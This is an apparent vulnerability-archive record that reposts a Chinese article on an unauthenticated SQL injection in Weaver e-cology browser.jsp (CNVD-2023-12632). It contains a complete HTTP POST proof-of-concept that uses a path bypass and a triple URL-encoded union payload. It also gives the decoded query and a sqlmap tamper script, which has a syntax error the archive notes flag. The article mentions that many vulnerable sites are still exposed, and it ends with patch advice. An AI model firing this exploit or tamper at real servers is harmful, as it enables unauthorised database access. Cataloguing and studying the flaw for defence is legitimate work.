---
source: "MrWQ/vulnerability-paper"
title: "泛微e-cology browser.jsp未授权SQL注入"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2023-12632"
referenced_identifiers: "QVD-2023-5012"
identifier_status: "unknown"
affected_scope: "Ecology9<=10.55"
prerequisites: "前台；空格路径和三层编码绕过"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/_NzNyWjMrx4DhMtrYGZlVQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/CNVD-2023-12632--%20%E6%B3%9B%E5%BE%AE%20e-cology9%20%E6%9C%AA%E6%8E%88%E6%9D%83%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md"
id: "vw-7e3057ae07db29046ba7133f"
entity_id: "ve-7e3057ae07db29046ba7133f"
schema_version: "1"
---

# 泛微e-cology browser.jsp未授权SQL注入

## 条目说明

- 对象与具体问题：泛微e-cology；browser.jsp未授权SQL注入
- 版本、配置及部署条件：Ecology9<=10.55
- 认证与权限前提：前台；空格路径和三层编码绕过
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同接口与QVD-2023-5012文章互相引用，应主实体关联两标识而非凭编号制造两漏洞
- 区别普通路径与/mobile/%20/plugin绕过条件须保留
- tamper有独立中文顿号导致Python语法错误；HTTP无头体空行；缺补丁精确边界
- 新增SQL_EXISTS回显证据与编码解释，合并时保留

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_NzNyWjMrx4DhMtrYGZlVQ)

**声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责**

**---------------------------------------------------------------------------------  
**

上个月这个漏洞就复现了，但直到今天还是有师傅在问 poc 以及 poc 无效的问题。。。

别问了，以后这个不回复

在这放 poc 及脚本。

```http
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: \{\{Hostname\}\}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1222
isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37

```

可以看我上一篇关于这个漏洞的文章~ 狗头  

[QVD-2023-5012 - 泛微 E-cology9 SQL](http://mp.weixin.qq.com/s?__biz=Mzg5OTg5NzMzMA==&mid=2247483931&idx=2&sn=bfca0cc0348adff858846c654e55664d&chksm=c04d0086f73a8990cac38f1ac4e765de4f021702aa3856e97bbba2a01cf8eca32ec9eddcb1b6&scene=21#wechat_redirect)

**漏洞影响范围为**

Ecology9 <=10.55

这里的 poc 经过三次 url 全字符编码，原语句为：

```
a' union select 1,''+(select 'SQL_EXISTS')+'

```

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBGmAHHGshkOzxiclY7yrbIPv3zpxgib3uibhde8F9THk31MWodzG02xzpg/640?wx_fmt=png)

很明显的回显点，所以这不是盲注，这不是盲注，这不是盲注！！

不管盲注显注，显然可以直接上 sqlmap，但有些师傅不会全字符编码，问 gpt 也不行，也就导致一跑脚本直接 gg，这里放下 tamper：

```
def tamper(payload, **kwargs):
    # URL encoding for all characters
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in payload])
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])
    encoded_payload = ''.join(['%' + format(ord(c), 'x') for c in encoded_payload])
、
    encoded_payload = encoded_payload.replace(' ', '%20')
    return encoded_payload

```

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wB0yHxhZhq25ySqIfibcatu62rmDbnvcoVK7usf1ic4olIaIgiceoTKgxKQ/640?wx_fmt=png)

到这里师傅们觉得 sqlmap 盲注太慢了，可以自己构造语句，直接查询：

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBIeibyt8VpdBpczzr651gCbKD0uiaNUuQ6gzamHLPOgorCdlFMiadv8k0Q/640?wx_fmt=png)

用 sqlshell 写语句查询：

![](https://mmbiz.qpic.cn/mmbiz_png/ZXHK19fFGk5WnW9nkBHdDib7d3Ybga9wBE6DEnbt2a2nUPynazmKMlVVQWBcwibia8k6HOP7x62X63CQ4X2Zw6Mvw/640?wx_fmt=png)

或者自己写个脚本查询都行。。。  

目前互联网上仍然有大量存在该漏洞的网站，包括上市集团。

**修复方案**

目前官方已发布安全补丁修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接如下：

https://www.weaver.com.cn/cs/securityDownload.asp#

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
